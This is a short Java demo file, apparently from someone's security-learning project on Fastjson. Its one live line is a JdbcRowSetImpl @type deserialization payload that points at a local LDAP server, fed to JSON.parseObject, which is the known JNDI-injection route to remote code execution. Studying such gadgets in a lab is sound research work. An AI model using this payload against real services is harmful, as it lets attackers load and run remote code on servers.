/*
 * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.
 * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.
 * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.
 * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.
 * Vestibulum commodo. Ut rhoncus gravida arcu.
 */

package com.y5neko.sec.fastjson;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;

public class demo {
    public static void main(String[] args) {
//        String s = "{\"param1\":\"test1\",\"param2\":\"test2\"}";
//        String s2 = "{\"age\":18,\"name\":\"Y5neKO\"}";
//        JSONObject jsonObject = JSON.parseObject(s);
//        Person person = JSON.parseObject(s2, Person.class);
//        System.out.println(jsonObject);
//        System.out.println(jsonObject.getString("param1"));
//        System.out.println("------------");
//        System.out.println(person.getName());
        //String s3 = "{\"@type\":\"com.y5neko.sec.fastjson.Person\",\"age\":18,\"name\":\"abc\"}";
        String s3 = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"DataSourceName\":\"ldap://127.0.0.1:8085/HfNCBhSf\",\"AutoCommit\":\"true\"}";
        //Object object1 = JSON.parse(s3);
        //Object object2 = JSON.parseObject(s3, Person.class);
        Object object3 = JSON.parseObject(s3);
//        System.out.println("-------------");
//        System.out.println("object1:");
//        System.out.println(object1);
//        System.out.println("-------------");
//        System.out.println("object2:");
//        System.out.println(object2);
//        System.out.println("-------------");
//        System.out.println("object3:");
//        System.out.println(object3);

    }
}